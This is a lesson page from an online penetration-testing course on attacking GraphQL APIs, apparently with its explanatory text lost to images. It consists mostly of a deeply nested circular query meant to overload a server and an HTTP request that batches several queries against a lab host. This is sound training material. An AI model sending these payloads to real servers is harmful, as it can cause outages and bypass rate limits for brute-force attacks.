<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/271/section/3155
// Platform Version: V1
// Module ID: 271
// Module Name: Attacking GraphQL
// Module Difficulty: Medium
// Section ID: 3155
// Section Title: Denial-of-Service (DoS) & Batching Attacks
// Page Title: Attacking GraphQL
// Page Number: 05
-->

# Denial-of-Service (DoS) & Batching Attacks

**Module Name:** Attacking GraphQL **Page Number:** 05

#### ATTACKING GRAPHQL Mini-Module

# Denial-of-Service (DoS) & Batching Attacks

## Denial-of-Service (DoS) Attacks

![https://academy.hackthebox.com/storage/modules/271/info_5.png](https://academy.hackthebox.com/storage/modules/271/info_5.png)

``` graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/dos_1.png](https://academy.hackthebox.com/storage/modules/271/dos_1.png)

``` graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/dos_2.png](https://academy.hackthebox.com/storage/modules/271/dos_2.png)

## Batching Attacks

``` http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

![https://academy.hackthebox.com/storage/modules/271/batching_1.png](https://academy.hackthebox.com/storage/modules/271/batching_1.png)

####